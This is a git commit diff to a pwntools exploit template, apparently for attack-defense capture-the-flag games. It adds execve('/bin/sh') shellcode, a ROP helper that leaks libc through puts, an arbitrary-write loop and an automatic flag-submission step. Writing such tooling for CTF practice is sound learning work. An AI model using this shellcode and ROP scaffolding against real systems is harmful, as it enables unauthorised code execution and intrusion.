2da03b89b986ab5f6c13ffd50ad9b9bd60bb9855
n132 <xmei5@asu.edu>
2024-09-12 01:50:10 -0700

    Update template.py

--- template.py
+++ template.py
@@ -1,10 +1,10 @@
 from pwn import *
 import sys
-context.log_level   ='debug'
 context.arch        ='amd64'
-
+CHALLENGE = './challenge'
 IP = "0.0.0.0"
 PORT = 31337
+TEAM = 1
 '''
 Libc Lib:
     https://libc.rip/
@@ -13,7 +13,7 @@ Libc Lib:
 
 DEBUG = False if len(sys.argv) > 1 else True
 if DEBUG:
-    p=process('./challenge',env={"LD_PRELOAD":"../libc.so.6"})
+    p=process(CHALLENGE,env={"LD_PRELOAD":"../libc.so.6"})
 else:
     p = remote(IP,PORT)
 
@@ -33,17 +33,59 @@ def leak(a,x=0,mute=0):
         leaked = int(ru(x)[:-1],16)
     else:
         leaked = u64(p.read(6)+b'\0\0')
-    if mute!=0:
+    if mute==0:
         warn(hex(leaked))
     return leaked
 def debug(script):
     if DEBUG:
         gdb.attach(p,script)
+def asmsh():
+    sh ='''
+    xor rdi, rdi
+    xor rsi, rsi
+    xor rdx, rdx
+    xor rax, rax
+    mov al, 0x3b
+    mov rdi,0x68732f6e69622f2f
+    push rdx
+    push rdi
+    mov rdi,rsp
+    syscall
+    '''
+    return asm(sh)#shellcraft.sh())
+def PRM(base=0x400000):
+    elf = ELF(CHALLENGE)
+    elf.address = base
+    bin_rop = ROP(elf)
+    rdi = bin_rop.find_gadget(['pop rdi','ret'])[0]
+    got = elf.got['puts']
+    plt = elf.plt['puts']
+    main = elf.sym['main']
+    return [rdi,got,plt,main]
+
+
+def kv(k,v,ctn=1):
+    # Write a function set address k to v
+    pass
+
+
+def aarLoop(addr,pay,func,pad=b'\x90'):
+    padlen = (8-(len(pay) % 8)) if len(pay) % 8 else 0
+    pay+= padlen*pad
+    total = len(pay)
+    for slot in range(int(total/8)):
+        if slot != int(total/8)-1:
+            func(addr+slot*8,u64(pay[slot*8:slot*8+8]))
+        else:
+            func(addr+slot*8,u64(pay[slot*8:slot*8+8]),0)
+
 
 PIE_BASE = 0x555555554000
+context.log_level   ='debug'
+debug('b * ')
 
 
-debug('bof 0x')
+
 # libc = ELF("../libc.so.6")
 
 # libc.address = base
@@ -54,9 +96,6 @@ debug('bof 0x')
 # system  = libc.sym['system']
 # chain   = [ret]*1 + [rdi,sh_str,system]
 
-
-
-# sl("./submitter 1")
+if not DEBUG:
+    sl(f"./submitter {TEAM}")
 p.interactive()
-
-
